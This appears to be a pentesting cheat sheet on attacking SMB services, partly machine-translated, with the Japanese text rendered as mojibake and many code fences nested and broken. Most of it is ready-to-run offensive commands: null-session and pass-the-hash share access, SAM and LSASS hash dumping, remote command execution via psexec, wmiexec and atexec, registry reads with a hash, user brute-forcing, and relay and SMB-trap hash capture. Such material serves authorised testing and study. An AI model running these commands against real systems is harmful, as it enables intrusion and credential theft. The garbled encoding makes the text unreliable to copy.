smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> # ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’çœç•¥ã™ã‚‹ã¨ãƒ—ãƒ­ãƒ³ãƒ—ãƒˆãŒè¡¨ç¤ºã•ã‚Œã¾ã™ã€‚--pw-nt-hashã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€æä¾›ã•ã‚ŒãŸãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã¯NTãƒãƒƒã‚·ãƒ¥ã§ã™ã€‚
```

## smbmapã‚³ãƒãƒ³ãƒ‰

```bash
smbmap -H <IP> [-P <PORT>] # ãƒŒãƒ«ãƒ¦ãƒ¼ã‚¶ãƒ¼
smbmap -u "username" -p "password" -H <IP> [-P <PORT>] # è³‡æ ¼æƒ…å ±
smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] # ãƒ‘ã‚¹ãƒ»ã‚¶ãƒ»ãƒãƒƒã‚·ãƒ¥
smbmap -R -u "username" -p "password" -H <IP> [-P <PORT>] # å†å¸°çš„ãªãƒªã‚¹ãƒˆ
```

## crackmapexecã‚³ãƒãƒ³ãƒ‰

```bash
crackmapexec smb <IP> -u '' -p '' --shares # ãƒŒãƒ«ãƒ¦ãƒ¼ã‚¶ãƒ¼
crackmapexec smb <IP> -u 'username' -p 'password' --shares # ã‚²ã‚¹ãƒˆãƒ¦ãƒ¼ã‚¶ãƒ¼
crackmapexec smb <IP> -u 'username' -H '<HASH>' --shares # ã‚²ã‚¹ãƒˆãƒ¦ãƒ¼ã‚¶ãƒ¼
```
```
```

### **Connect/List a shared folder**

```bash
# smbclientã‚’ä½¿ç”¨ã—ã¦æ¥ç¶šã™ã‚‹
smbclient --no-pass //<IP>/<Folder>
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’çœç•¥ã™ã‚‹ã¨ã€ãƒ—ãƒ­ãƒ³ãƒ—ãƒˆãŒè¡¨ç¤ºã•ã‚Œã¾ã™ã€‚--pw-nt-hashã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€æä¾›ã•ã‚ŒãŸãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã¯NTãƒãƒƒã‚·ãƒ¥ã§ã™
# --no-pass -c 'recurse;ls' ã‚’ä½¿ç”¨ã—ã¦smbclientã§å†å¸°çš„ã«ãƒªã‚¹ãƒˆã‚’è¡¨ç¤ºã™ã‚‹

# smbmapã‚’ä½¿ç”¨ã—ã¦ãƒªã‚¹ãƒˆã‚’è¡¨ç¤ºã™ã‚‹ã€‚ãƒ•ã‚©ãƒ«ãƒ€ã‚’æŒ‡å®šã—ãªã„å ´åˆã€ã™ã¹ã¦ã‚’ãƒªã‚¹ãƒˆã—ã¾ã™
smbmap [-u "username" -p "password"] -R [Folder] -H <IP> [-P <PORT>] # å†å¸°çš„ãªãƒªã‚¹ãƒˆ
smbmap [-u "username" -p "password"] -r [Folder] -H <IP> [-P <PORT>] # éå†å¸°çš„ãªãƒªã‚¹ãƒˆ
smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [Folder] -H <IP> [-P <PORT>] # ãƒ‘ã‚¹ãƒ»ã‚¶ãƒ»ãƒãƒƒã‚·ãƒ¥
```

### **Manually enumerate windows shares and connect to them**

It may be possible that you are restricted to display any shares of the host machine and when you try to list them it appears as if there aren't any shares to connect to. Thus it might be worth a short to try to manually connect to a share. To enumerate the shares manually you might want to look for responses like NT\_STATUS\_ACCESS\_DENIED and NT\_STATUS\_BAD\_NETWORK\_NAME, when using a valid session (e.g. null session or valid credentials). These may indicate whether the share exists and you do not have access to it or the share does not exist at all.

Common share names for windows targets are

* C$
* D$
* ADMIN$
* IPC$
* PRINT$
* FAX$
* SYSVOL
* NETLOGON

(Common share names from _**Network Security Assessment 3rd edition**_)

You can try to connect to them by using the following command

```bash
```markdown
## smbclientã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦Windowså…±æœ‰ã«æ¥ç¶šã™ã‚‹

ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€Windowså…±æœ‰ã«æ¥ç¶šã™ã‚‹ãŸã‚ã®smbclientã‚³ãƒãƒ³ãƒ‰ã§ã™ã€‚

### Nullã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦æ¥ç¶šã™ã‚‹å ´åˆ

```bash
smbclient -U '%' -N \\\\<IP>\\<SHARE>
```

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€nullã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦Windowså…±æœ‰ã«æ¥ç¶šã—ã¾ã™ã€‚

### èªè¨¼ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦æ¥ç¶šã™ã‚‹å ´åˆ

```bash
smbclient -U '<USER>' \\\\<IP>\\<SHARE>
```

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€èªè¨¼ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦Windowså…±æœ‰ã«æ¥ç¶šã—ã¾ã™ï¼ˆãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®å…¥åŠ›ãŒæ±‚ã‚ã‚‰ã‚Œã¾ã™ï¼‰ã€‚
```
```

or this script (using a null session)

```bash
#/bin/bash

ip='<TARGET-IP-HERE>'
shares=('C$' 'D$' 'ADMIN$' 'IPC$' 'PRINT$' 'FAX$' 'SYSVOL' 'NETLOGON')

for share in ${shares[*]}; do
output=$(smbclient -U '%' -N \\\\$ip\\$share -c '')

if [[ -z $output ]]; then
echo "[+] $share ã«å¯¾ã—ã¦ãƒŒãƒ«ã‚»ãƒƒã‚·ãƒ§ãƒ³ã®ä½œæˆãŒå¯èƒ½ã§ã™" # ã‚³ãƒãƒ³ãƒ‰ãŒå®Ÿè¡Œã•ã‚ŒãŸå ´åˆã¯å‡ºåŠ›ãŒãªã„ãŸã‚ã€ã‚»ãƒƒã‚·ãƒ§ãƒ³ãŒä½œæˆã•ã‚ŒãŸã¨ä»®å®šã—ã¾ã™
else
echo $output # ã‚¨ãƒ©ãƒ¼ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’è¡¨ç¤ºã—ã¾ã™ï¼ˆä¾‹ï¼šNT_STATUS_ACCESS_DENIEDã¾ãŸã¯NT_STATUS_BAD_NETWORK_NAMEï¼‰
fi
done
```

examples

```bash
```markdown
## SMB (Server Message Block) ãƒšãƒ³ãƒ†ã‚¹ãƒˆ

### smbclientã‚³ãƒãƒ³ãƒ‰

ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€SMBã‚µãƒ¼ãƒãƒ¼ã¸ã®æ¥ç¶šã‚’ãƒ†ã‚¹ãƒˆã§ãã¾ã™ã€‚

```bash
smbclient -U '%' -N \\\\192.168.0.24\\im_clearly_not_here # NT_STATUS_BAD_NETWORK_NAMEãŒè¿”ã•ã‚Œã¾ã™
smbclient -U '%' -N \\\\192.168.0.24\\ADMIN$ # NT_STATUS_ACCESS_DENIEDãŒè¿”ã•ã‚Œã‚‹ã‹ã€ã‚»ãƒƒã‚·ãƒ§ãƒ³ãŒä¸ãˆã‚‰ã‚Œã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™
```
```
```

### Mount a shared folder

```bash
```markdown
ä»¥ä¸‹ã¯ã€SMBï¼ˆServer Message Blockï¼‰ã®ãƒšãƒ³ãƒ†ã‚¹ãƒˆã«é–¢ã™ã‚‹å†…å®¹ã§ã™ã€‚

```bash
mount -t cifs //x.x.x.x/share /mnt/share
mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share
```

ä¸Šè¨˜ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€SMBå…±æœ‰ã‚’ãƒã‚¦ãƒ³ãƒˆã™ã‚‹ãŸã‚ã®ã‚‚ã®ã§ã™ã€‚`x.x.x.x`ã¯SMBã‚µãƒ¼ãƒãƒ¼ã®IPã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’è¡¨ã—ã¦ãŠã‚Šã€`share`ã¯å…±æœ‰åã§ã™ã€‚`/mnt/share`ã¯ãƒã‚¦ãƒ³ãƒˆãƒã‚¤ãƒ³ãƒˆã®ãƒ‘ã‚¹ã§ã™ã€‚

1ã¤ç›®ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦SMBå…±æœ‰ã‚’ãƒã‚¦ãƒ³ãƒˆã—ã¾ã™ã€‚

2ã¤ç›®ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€`username`ã¨`password`ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦ç‰¹å®šã®ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æŒ‡å®šã—ã¦SMBå…±æœ‰ã‚’ãƒã‚¦ãƒ³ãƒˆã—ã¾ã™ã€‚

ã“ã‚Œã‚‰ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€SMBå…±æœ‰ã‚’ãƒ­ãƒ¼ã‚«ãƒ«ãƒã‚·ãƒ³ã«ãƒã‚¦ãƒ³ãƒˆã—ã€ãƒ•ã‚¡ã‚¤ãƒ«ã‚„ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```
```

### **Download files**

Read previous sections to learn how to connect with credentials/Pass-the-Hash.

```bash
# ãƒ•ã‚¡ã‚¤ãƒ«ã®æ¤œç´¢ã¨ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰
sudo smbmap -R ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼ -H <IP> -A <ãƒ•ã‚¡ã‚¤ãƒ«å> -q # å†å¸°ãƒ¢ãƒ¼ãƒ‰ã§ãƒ•ã‚¡ã‚¤ãƒ«ã‚’æ¤œç´¢ã—ã€/usr/share/smbmapå†…ã«ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™
```

```bash
# ã™ã¹ã¦ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã™ã‚‹
smbclient //<IP>/<å…±æœ‰å>
> mask ""
> recurse
> prompt
> mget *
# ã™ã¹ã¦ã‚’ç¾åœ¨ã®ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã™ã‚‹
```

Commands:

* mask: specifies the mask which is used to filter the files within the directory (e.g. "" for all files)
* recurse: toggles recursion on (default: off)
* prompt: toggles prompting for filenames off (default: on)
* mget: copies all files matching the mask from host to client machine

(_Information from the manpage of smbclient_)

### Domain Shared Folders Search

* [**Snaffler**](https://github.com/SnaffCon/Snaffler)****

```bash
```plaintext
Snaffler.exe -s -d domain.local -o snaffler.log -v data
```

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€Snafflerã¨ã„ã†ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã€`domain.local`ã¨ã„ã†ãƒ‰ãƒ¡ã‚¤ãƒ³ã«å¯¾ã—ã¦SMBï¼ˆServer Message Blockï¼‰ã®ãƒšãƒ³ãƒ†ã‚¹ãƒˆã‚’å®Ÿè¡Œã—ã¾ã™ã€‚`-s`ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã¯ã€SMBã‚µãƒ¼ãƒ“ã‚¹ã‚’ã‚¹ã‚­ãƒ£ãƒ³ã™ã‚‹ã“ã¨ã‚’æŒ‡å®šã—ã¦ã„ã¾ã™ã€‚`-d`ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã¯ã€å¯¾è±¡ã¨ãªã‚‹ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚’æŒ‡å®šã—ã¾ã™ã€‚`-o`ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã¯ã€çµæœã‚’`snaffler.log`ã¨ã„ã†ãƒ•ã‚¡ã‚¤ãƒ«ã«å‡ºåŠ›ã™ã‚‹ã“ã¨ã‚’æŒ‡å®šã—ã¾ã™ã€‚`-v`ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã¯ã€è©³ç´°ãªæƒ…å ±ã‚’è¡¨ç¤ºã™ã‚‹ã“ã¨ã‚’æŒ‡å®šã—ã¾ã™ã€‚`data`ã¯ã€ã‚¹ã‚­ãƒ£ãƒ³å¯¾è±¡ã®ãƒ‡ãƒ¼ã‚¿ã§ã™ã€‚
```

* [**CrackMapExec**](https://wiki.porchetta.industries/smb-protocol/spidering-shares) spider.
* `-M spider_plus [--share <share_name>]`
* `--pattern txt`

```bash
```shell
sudo crackmapexec smb 10.10.10.10 -u ãƒ¦ãƒ¼ã‚¶ãƒ¼å -p ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ -M spider_plus --share 'éƒ¨é–€ã®å…±æœ‰'
```
```

Specially interesting from shares are the files called **`Registry.xml`** as they **may contain passwords** for users configured with **autologon** via Group Policy. Or **`web.config`** files as they contains credentials.

{% hint style="info" %}
The **SYSVOL share** is **readable** by all authenticated users in the domain. In there you may **find** many different batch, VBScript, and PowerShell **scripts**.\
You should **check** the **scripts** inside of it as you might **find** sensitive info such as **passwords**.
{% endhint %}

## Read Registry

You may be able to **read the registry** using some discovered credentials. Impacket **`reg.py`** allows you to try:

```bash
```
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKCU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKLM -s
```

```
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKCU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKLM -s
```
```

## Post Exploitation

The **default config of** a **Samba** server is usually located in `/etc/samba/smb.conf` and might have some **dangerous configs**:

| **Setting**                 | **Description**                                                     |
| --------------------------- | ------------------------------------------------------------------- |
| `browseable = yes`          | Allow listing available shares in the current share?                |
| `read only = no`            | Forbid the creation and modification of files?                      |
| `writable = yes`            | Allow users to create and modify files?                             |
| `guest ok = yes`            | Allow connecting to the service without using a password?           |
| `enable privileges = yes`   | Honor privileges assigned to specific SID?                          |
| `create mask = 0777`        | What permissions must be assigned to the newly created files?       |
| `directory mask = 0777`     | What permissions must be assigned to the newly created directories? |
| `logon script = script.sh`  | What script needs to be executed on the user's login?               |
| `magic script = script.sh`  | Which script should be executed when the script gets closed?        |
| `magic output = script.out` | Where the output of the magic script needs to be stored?            |

The command `smbstatus` gives information about the **server** and about **who is connected**.

## Authenticate using Kerberos

You can **authenticate** to **kerberos** using the tools **smbclient** and **rpcclient**:

```bash
## SMB (Server Message Block)ã®ãƒšãƒ³ãƒ†ã‚¹ãƒˆ

### smbclientã‚³ãƒãƒ³ãƒ‰

```shell
smbclient --kerberos //ws01win10.domain.com/C$
```

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€Kerberosèªè¨¼ã‚’ä½¿ç”¨ã—ã¦`ws01win10.domain.com`ã®`C$`å…±æœ‰ã«æ¥ç¶šã™ã‚‹ãŸã‚ã®ã‚‚ã®ã§ã™ã€‚

### rpcclientã‚³ãƒãƒ³ãƒ‰

```shell
rpcclient -k ws01win10.domain.com
```

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€Kerberosèªè¨¼ã‚’ä½¿ç”¨ã—ã¦`ws01win10.domain.com`ã«æ¥ç¶šã™ã‚‹ãŸã‚ã®ã‚‚ã®ã§ã™ã€‚
```

## **Execute Commands**

### **crackmapexec**

crackmapexec can execute commands **abusing** any of **mmcexec, smbexec, atexec, wmiexec** being **wmiexec** the **default** method. You can indicate which option you prefer to use with the parameter `--exec-method`:

```bash
```markdown
apt-get install crackmapexec

crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #PowerShellã‚’å®Ÿè¡Œ
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #cmdã‚’å®Ÿè¡Œ
crackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami #Pass-the-Hash
# --exec-method {mmcexec,smbexec,atexec,wmiexec}ã‚’ä½¿ç”¨

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam #SAMã‚’ãƒ€ãƒ³ãƒ—
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa #ãƒ¡ãƒ¢ãƒªå†…ã®LSASSãƒãƒƒã‚·ãƒ¥ã‚’ãƒ€ãƒ³ãƒ—
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions #ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’å–å¾—
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --loggedon-users #ãƒ­ã‚°ã‚¤ãƒ³ä¸­ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’å–å¾—
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks #ãƒ‡ã‚£ã‚¹ã‚¯ã‚’åˆ—æŒ™
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --users #ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’åˆ—æŒ™
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --groups #ã‚°ãƒ«ãƒ¼ãƒ—ã‚’åˆ—æŒ™
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --local-groups #ãƒ­ãƒ¼ã‚«ãƒ«ã‚°ãƒ«ãƒ¼ãƒ—ã‚’åˆ—æŒ™
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --pass-pol #ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒãƒªã‚·ãƒ¼ã‚’å–å¾—
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --rid-brute #RIDãƒ–ãƒ«ãƒ¼ãƒˆ

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -H <HASH> #Pass-The-Hash
```
```

### [**psexec**](../windows-hardening/ntlm/psexec-and-winexec.md)**/**[**smbexec**](../windows-hardening/ntlm/smbexec.md)

Both options will **create a new service** (using _\pipe\svcctl_ via SMB) in the victim machine and use it to **execute something** (**psexec** will **upload** an executable file to ADMIN$ share and **smbexec** will point to **cmd.exe/powershell.exe** and put in the arguments the payload --**file-less technique-**-).\
**More info** about [**psexec** ](../windows-hardening/ntlm/psexec-and-winexec.md)and [**smbexec**](../windows-hardening/ntlm/smbexec.md).\
In **kali** it is located on /usr/share/doc/python3-impacket/examples/

```bash
# ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒæä¾›ã•ã‚Œã¦ã„ãªã„å ´åˆã€ãƒ—ãƒ­ãƒ³ãƒ—ãƒˆãŒè¡¨ç¤ºã•ã‚Œã¾ã™
./psexec.py [[ãƒ‰ãƒ¡ã‚¤ãƒ³/]ãƒ¦ãƒ¼ã‚¶ãƒ¼å[:ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰]@]<ã‚¿ãƒ¼ã‚²ãƒƒãƒˆåã¾ãŸã¯ã‚¢ãƒ‰ãƒ¬ã‚¹>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒãƒƒã‚·ãƒ¥ã‚’ä½¿ç”¨
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t #ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒãƒƒã‚·ãƒ¥ã‚’ä½¿ç”¨
```

Using **parameter**`-k` you can authenticate against **kerberos** instead of **NTLM**

### [wmiexec](../windows-hardening/ntlm/wmicexec.md)/dcomexec

Stealthily execute a command shell without touching the disk or running a new service using DCOM via **port 135.**\
In **kali** it is located on /usr/share/doc/python3-impacket/examples/

```bash
#ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒæä¾›ã•ã‚Œã¦ã„ãªã„å ´åˆã€ãƒ—ãƒ­ãƒ³ãƒ—ãƒˆãŒè¡¨ç¤ºã•ã‚Œã¾ã™
./wmiexec.py [[ãƒ‰ãƒ¡ã‚¤ãƒ³/]ãƒ¦ãƒ¼ã‚¶ãƒ¼å[:ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰]@]<ã‚¿ãƒ¼ã‚²ãƒƒãƒˆåã¾ãŸã¯ã‚¢ãƒ‰ãƒ¬ã‚¹> #ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®å…¥åŠ›ã‚’æ±‚ã‚ã‚‹
./wmiexec.py -hashes LM:NT administrator@10.10.10.103 #ãƒ‘ã‚¹ãƒ»ã‚¶ãƒ»ãƒãƒƒã‚·ãƒ¥
#ã‚³ãƒãƒ³ãƒ‰ã®æœ«å°¾ã«å®Ÿè¡Œã™ã‚‹CMDã‚³ãƒãƒ³ãƒ‰ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚è¿½åŠ ã—ãªã„å ´åˆã€åŠå¯¾è©±å‹ã‚·ã‚§ãƒ«ãŒè¡¨ç¤ºã•ã‚Œã¾ã™
```

Using **parameter**`-k` you can authenticate against **kerberos** instead of **NTLM**

```bash
#ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒæä¾›ã•ã‚Œã¦ã„ãªã„å ´åˆã€ãƒ—ãƒ­ãƒ³ãƒ—ãƒˆãŒè¡¨ç¤ºã•ã‚Œã¾ã™
./dcomexec.py [[ãƒ‰ãƒ¡ã‚¤ãƒ³/]ãƒ¦ãƒ¼ã‚¶ãƒ¼å[:ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰]@]<ã‚¿ãƒ¼ã‚²ãƒƒãƒˆåã¾ãŸã¯ã‚¢ãƒ‰ãƒ¬ã‚¹>
./dcomexec.py -hashes <LM:NT> administrator@10.10.10.103 #ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æ¸¡ã™
#ã‚³ãƒãƒ³ãƒ‰ã®æœ«å°¾ã«å®Ÿè¡Œã™ã‚‹CMDã‚³ãƒãƒ³ãƒ‰ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚è¿½åŠ ã—ãªã„å ´åˆã€åŠå¯¾è©±å‹ã®ã‚·ã‚§ãƒ«ãŒè¡¨ç¤ºã•ã‚Œã¾ã™
```

### [AtExec](../windows-hardening/ntlm/atexec.md)

Execute commands via the Task Scheduler (using _\pipe\atsvc_ via SMB).\
In **kali** it is located on /usr/share/doc/python3-impacket/examples/

```bash
```shell
./atexec.py [[ãƒ‰ãƒ¡ã‚¤ãƒ³/]ãƒ¦ãƒ¼ã‚¶ãƒ¼å[:ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰]@]<ã‚¿ãƒ¼ã‚²ãƒƒãƒˆåã¾ãŸã¯ã‚¢ãƒ‰ãƒ¬ã‚¹> "ã‚³ãƒãƒ³ãƒ‰"
./atexec.py -hashes <LM:NT> administrator@10.10.10.175 "whoami"
```
```

## Impacket reference

[https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)

## **Bruteforce users credentials**

**This is not recommended, you could block an account if you exceed the maximum allowed tries**

```bash
```markdown
## SMB Brute Force

To perform a brute force attack on the SMB service, you can use the `nmap` tool with the `smb-brute` script. The following command will attempt to brute force the SMB service on port 445 of the specified IP address:

```bash
nmap --script smb-brute -p 445 <IP>
```

Another approach is to use the `ridenum.py` script to obtain a list of usernames by brute forcing the RIDs. Once you have the list of usernames, you can then attempt to brute force each username. The following command will perform this process, specifying the IP address, the range of RIDs to brute force (from 500 to 50000), and the path to a file containing a list of passwords:

```bash
ridenum.py <IP> 500 50000 /root/passwds.txt
```
```
```

## SMB relay attack

This attack uses the Responder toolkit to **capture SMB authentication sessions** on an internal network, and **relays** them to a **target machine**. If the authentication **session is successful**, it will automatically drop you into a **system** **shell**.\
[**More information about this attack here.**](../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

## SMB-Trap

The Windows library URLMon.dll automatically try to authenticaticate to the host when a page tries to access some contect via SMB, for example: `img src="\\10.10.10.10\path\image.jpg"`

This happens with the functions:

* URLDownloadToFile
* URLDownloadToCache
* URLOpenStream
* URLOpenBlockingStream

Which are used by some browsers and tools (like Skype)

![From: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../.gitbook/assets/image (93).png>)

### SMBTrap using MitMf

![From: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../.gitbook/assets/image (94).png>)

## NTLM Theft

Similar to SMB Trapping, planting malicious files onto a target system (via SMB, for example) can illicit an SMB authentication attempt, allowing the NetNTLMv2 hash to be intercepted with a tool such as Responder. The hash can then be cracked offline or used in an [SMB relay attack](pentesting-smb.md#smb-relay-attack).

[See: ntlm\_theft](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#ntlm\_theft)

## HackTricks Automatic Commands

```
Protocol_Name: SMB    #ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã®ç•¥ç§°ãŒã‚ã‚‹å ´åˆã¯è¨˜è¼‰ã™ã‚‹ã€‚
Port_Number:  137,138,139     #è¤‡æ•°ã‚ã‚‹å ´åˆã¯ã‚«ãƒ³ãƒã§åŒºåˆ‡ã‚‹ã€‚
Protocol_Description: Server Message Block         #ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã®ç•¥ç§°ã‚’å…¨ã¦æ›¸ã

Entry_1:
Name: ãƒãƒ¼ãƒˆ
Description: SMBã®ãƒãƒ¼ãƒˆ
Note: |
ãƒãƒ¼ãƒˆ139ã¯æŠ€è¡“çš„ã«ã¯ã€ŒNBT over IPã€ã¨ã—ã¦çŸ¥ã‚‰ã‚Œã¦ã„ã¾ã™ãŒã€ãƒãƒ¼ãƒˆ445ã¯ã€ŒSMB over IPã€ã¨ã—ã¦çŸ¥ã‚‰ã‚Œã¦ã„ã¾ã™ã€‚SMBã¯ã€ŒServer Message Blocksã€ã®ç•¥ã§ã™ã€‚ç¾ä»£ã®è¨€èªã§ã¯ã€Server Message Blockã¯Common Internet File Systemã¨ã—ã¦ã‚‚çŸ¥ã‚‰ã‚Œã¦ã„ã¾ã™ã€‚ã“ã®ã‚·ã‚¹ãƒ†ãƒ ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®ãƒãƒ¼ãƒ‰é–“ã§ãƒ•ã‚¡ã‚¤ãƒ«ã€ãƒ—ãƒªãƒ³ã‚¿ã€ã‚·ãƒªã‚¢ãƒ«ãƒãƒ¼ãƒˆãªã©ã®å…±æœ‰ã‚¢ã‚¯ã‚»ã‚¹ã‚’æä¾›ã™ã‚‹ãŸã‚ã«ä¸»ã«ä½¿ç”¨ã•ã‚Œã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å±¤ã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã§ã™ã€‚

#ä»¥ä¸‹ã¯ã€ã‚ªãƒ¼ãƒ—ãƒ³ãªSMBãƒãƒ¼ãƒˆã‚’è¦‹ã¤ã‘ãŸå ´åˆã«æ¯å›å®Ÿè¡Œã™ã‚‹ã‚³ãƒãƒ³ãƒ‰ã§ã™ã€‚

èªè¨¼æƒ…å ±ãªã—ã§
nbtscan {IP}
smbmap -H {IP}
smbmap -H {IP} -u null -p null
smbmap -H {IP} -u guest
smbclient -N -L //{IP}
smbclient -N //{IP}/ --option="client min protocol"=LANMAN1
rpcclient {IP}
rpcclient -U "" {IP}
crackmapexec smb {IP}
crackmapexec smb {IP} --pass-pol -u "" -p ""
crackmapexec smb {IP} --pass-pol -u "guest" -p ""
GetADUsers.py -dc-ip {IP} "{Domain_Name}/" -all
GetNPUsers.py -dc-ip {IP} -request "{Domain_Name}/" -format hashcat
GetUserSPNs.py -dc-ip {IP} -request "{Domain_Name}/"
getArch.py -target {IP}

